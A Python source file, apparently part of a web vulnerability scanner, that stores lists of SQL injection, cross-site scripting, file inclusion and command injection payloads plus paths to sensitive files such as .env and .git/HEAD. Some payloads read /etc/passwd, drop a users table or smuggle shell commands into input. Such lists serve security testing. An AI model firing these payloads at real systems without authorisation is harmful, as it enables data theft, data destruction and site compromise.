import os

class PayloadManager:
    def __init__(self):
        self.sql_payloads = [
            "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", 
            "' OR 1=1--", "\" OR 1=1--", "admin' --", 
            "' UNION SELECT 1, version() --",
            "1'; DROP TABLE users --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php"
        ]
        
        self.cmd_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "; type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& ping -c 1 127.0.0.1",
            "$(whoami)"
        ]
        
        self.common_files = [
            "robots.txt", "sitemap.xml", ".env", "config.php", 
            "admin", "login", "backup.zip", ".git/HEAD",
            "wp-admin", "debug.log"
        ]

    def get_payloads(self, payload_type: str) -> list:
        if payload_type == "sqli":
            return self.sql_payloads
        elif payload_type == "xss":
            return self.xss_payloads
        elif payload_type == "lfi":
            return self.lfi_payloads
        elif payload_type == "cmd":
            return self.cmd_payloads
        elif payload_type == "directory":
            return self.common_files
        return []

    def load_from_file(self, filepath: str) -> list:
        """Loads payloads from a file, line by line."""
        if not os.path.exists(filepath):
            return []
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
